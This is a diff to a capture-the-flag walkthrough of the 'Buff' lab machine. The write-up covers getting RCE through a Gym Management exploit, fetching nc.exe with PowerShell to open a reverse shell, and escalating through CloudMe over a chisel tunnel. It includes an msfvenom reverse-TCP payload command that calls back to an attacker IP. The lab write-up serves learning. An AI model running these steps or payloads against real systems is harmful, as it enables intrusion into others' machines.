@@ -57,15 +57,15 @@ That version of the app has a know vulnerability that gives RCE to the attacker 
 
 ## Exploiting Gym management to get RCE
 
-By running the exploit providing the box ip we get RCE on the box. The shell that the script opened is not responsive \(we can't change directories\) but we can run commands on the box. So we spin up a python server on our box and we upload `nc.exe` on the machine using `powershe Invoke-WebRequest` since we have access to powershell. Since `nc.exe` gets uploaded we can call it from the webshell we got from the python script and get a responsive reverse shell on the box \(since the nc.exe doesn't get deleted or blocked we can assume that the box doesn't have an antivirus or some kind of malware detection\).
+By running the exploit providing the box ip we get RCE on the box. The shell that the script opened is not responsive \(we can't change directories\) but we can run commands on the box. So we spin up a python server on our box and we upload `nc.exe` on the machine using `powershe Invoke-WebRequest` since we have access to powershell. 
 
-1. Uploading `nc.exe` 
-![](../../.gitbook/assets/buff-nc.png)
+![Uploading nc.exe with powershell IWR](../../.gitbook/assets/buff-nc.png)
 
-2. Executing `nc` and getting a responsive reverse shell
-![](../../.gitbook/assets/buff-rce.png)
+Since `nc.exe` gets uploaded we can call it from the webshell we got from the python script and get a responsive reverse shell on the box \(since the nc.exe doesn't get deleted or blocked we can assume that the box doesn't have an antivirus or some kind of malware detection\).
 
-* We can get user.txt under `C:\Users\Shaun\Desktop\user.txt`
+![Executing nc.exe on the victim machine](../../.gitbook/assets/buff-rce.png)
+
+* At this point we can get user.txt under `C:\Users\Shaun\Desktop\user.txt`
 
 ## Privilege escalation
 
@@ -75,19 +75,19 @@ After some manual enumeration on the use we can see an app that stick out `Cloud
 
 ### Creating the payload and setting up Chisel
 
-Since python is not installed in the victim box we can use port forwarding to execute the script locally and send the payload to the victim using chisel. First we have to create a payload that opens a reverse TCP connection back to us. To do that we can use msfvenom and then use that created payload in the python script that we found.
+Since python is not installed in the victim box we can use port forwarding to execute the script locally and send the payload to the victim using chisel. First we have to create a payload that opens a reverse TCP connection back to us. To do that we can use msfvenom.
 
-1. To create the payload
-   `sudo msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.14.103 LPORT=1337 -f py -v payload`
-2. Locally open chisel in server mode
-   
-   ![](../../.gitbook/assets/buff-client-chisel.png)
-3.  Remotely execute chisel in client mode
+`sudo msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.14.103 LPORT=1337 -f py -v payload`
 
-   ![](../../.gitbook/assets/buff-serverchisel.png)
+Then use that created payload in the python script that we found. And set up chisel on our machine and on the victim machine.
+
+![Setting up chisel on the attacker machine](../../.gitbook/assets/buff-client-chisel.png)
+
+![Setting up chisel on the victim machine](../../.gitbook/assets/buff-serverchisel.png)
 
 So we have created the tunnel to forward the payload to the app so now we can execute the python script that sends the payload open a netcat listener and get administration access on the box.
 
 ![](../../.gitbook/assets/buff-root.png)
 
 * At this point we have administration access on the box and we can get `root.txt` under `c:\Users\Administrator\Desktop\root.txt`
+
